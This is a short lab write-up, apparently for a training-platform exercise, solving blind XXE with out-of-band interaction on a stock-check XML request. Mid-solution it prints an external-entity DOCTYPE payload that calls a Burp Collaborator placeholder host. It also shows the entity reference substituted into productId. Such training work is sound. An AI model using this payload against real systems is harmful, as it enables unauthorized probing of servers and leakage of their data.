# Lab: Blind XXE with out-of-band interaction

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/703fdae9-7829-4696-a58b-1c1e775bdc29)

## Solution

The application has stock check page.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/e9706344-025a-408f-a35f-204beacf9642)

The application checks for the stock level of a product by submitting XML to the server:

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ca61e6c1-ff53-41ef-8234-8df75fd89972)

Go to burp collaborator and click on **copy to clipboard**.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/77153dc5-755b-4a4b-ab0c-7bd3aab05529)

Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`
Replace the productId number with a reference to the external entity: `&xxe;`

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c1a67486-e60f-4d0d-bf0d-df3362fbe845)

o to the Collaborator tab, some DNS and HTTP interactions that were initiated by the application as the result of our payload wil be visible.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/6aca349c-832d-4284-ad13-bfcfaaad0ee0)

Making the application do the interactions solved the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/012349cb-ad55-418d-b094-9609e5e78d6e)
